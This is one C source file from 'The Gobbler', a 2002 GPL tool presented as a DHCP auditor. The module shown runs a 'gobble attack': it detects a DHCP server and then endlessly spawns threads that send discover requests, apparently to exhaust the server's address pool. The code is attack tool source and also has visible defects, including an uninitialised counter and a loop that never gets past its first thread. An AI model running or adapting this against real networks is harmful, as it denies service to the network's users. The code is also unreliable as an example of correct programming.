/*The Gobbler - A tool to audit DHCP networks
 *Copyright (C) 2002 Steven Jones root@networkpenetration.com
 *www.networkpenetration.com
 *
 *This program is free software; you can redistribute it and/or
 *modify it under the terms of the GNU General Public License
 *as published by the Free Software Foundation; either version 2
 *of the License, or (at your option) any later version.
 *
 *This program is distributed in the hope that it will be useful,
 *but WITHOUT ANY WARRANTY; without even the implied warranty of
 *MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *GNU General Public License for more details.
 *
 *You should have received a copy of the GNU General Public License
 *along with this program; if not, write to the Free Software
 *Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
*/

#include "gobbler.h"

extern int dhcpdetected;
extern void startdhcpdiscover(void);
extern void* status;
extern int dhcpgobblestarted;
extern int dhcpgobbling;
extern int nodetect;
extern int dhcpreplyinfo;
extern int phosts;

void startdhcpgobble(void)
{
	void thread_dhcpgobble(int);
	extern int checkdhcp(int);
	int i;
	
	printf("Detecting DHCP service for gobble attack\n");
	dhcpgobblestarted = 1;
	dhcpreplyinfo = 1;
	dhcpgobbling = 1;
	startdhcpdiscover();
	dhcpreplyinfo = 0;

	phosts = 1;
	usleep(50000);
	if(checkdhcp(0) != 0){
		printf("Opps: dhcpcheck error\n");
		exit(1);
	}
	
	if(!dhcpdetected){
		printf("Opps: DHCP serivce not detected\n");
		exit(1);
	}
	//printf("MAXGOBHANDLER %d\n", MAXGOBHANDLER);
	gptr = calloc(MAXGOBHANDLER, sizeof(gthread));
	for(i=0; i<MAXGOBHANDLER; i++){
		thread_dhcpgobble(i);
	//	usleep(50000);
	}
}

void thread_dhcpgobble(int i)
{
	void dhcpgobble(void *);
	extern int checkdhcp(int);
	int a;

	////printf("thread created\n");
	
	for(;;){
		usleep(50000);

		if(pthread_create(&gptr[i].thread_tid, NULL,(void *) &dhcpgobble, (void *) i) < 0){
			printf("Opps: pthread_create error\n");
			exit(1);
		}
		//printf("a = %d\n",a);
		if(a == 10){
			if(checkdhcp(2) != 0){
				if(v)printf("Opps: checkdhcp error\n");
			//exit(1);
			}
			a = 0;
			sleep(2);
		}
		a++;
		sleep(1);
	}
}


void dhcpgobble(void *tnum)
{
	if(v>2)printf("Gobbler started on thread(%ld)\n", pthread_self());
	if(pthread_detach(pthread_self()) != 0){
		printf("Opps: pthread_detach error\n\n");
		exit(1);
	}
	startdhcpdiscover(); //saves recoding whole chuncks of code //startdhcpdiscover
	pthread_exit(&status);
}
